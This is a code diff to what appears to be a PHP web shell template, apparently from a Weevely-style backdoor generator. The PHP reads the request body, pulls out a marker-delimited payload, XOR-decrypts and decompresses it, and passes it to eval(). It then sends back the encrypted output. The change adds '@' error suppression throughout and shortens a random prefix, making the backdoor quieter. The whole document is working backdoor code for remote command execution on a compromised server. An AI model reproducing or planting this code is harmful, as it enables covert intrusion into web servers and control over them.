@@ -4,7 +4,7 @@ key = passwordhash[:8]
 header = passwordhash[8:20]
 footer = passwordhash[20:32]
 
-PREPEND = utils.strings.randstr(24, charset = string.digits + string.letters)
+PREPEND = utils.strings.randstr(16, charset = string.digits + string.letters)
 %>$k="${key}";
 $kh="${header}";
 $kf="${footer}";
@@ -22,13 +22,12 @@ function x($t,$k){
 	}
 	return $o;
 }
-$d=file_get_contents("php://input");
-if (preg_match("/$kh(.+)$kf/", $d, $m) == 1) {
-  ob_start();
+if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m) == 1) {
+  @ob_start();
   @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
-  $o=ob_get_contents();
-  ob_end_clean();
-  $r=base64_encode(x(gzcompress($o),$k));
+  $o=@ob_get_contents();
+  @ob_end_clean();
+  $r=@base64_encode(@x(@gzcompress($o),$k));
   print("$p$kh$r$kf");
 }
 </%text>
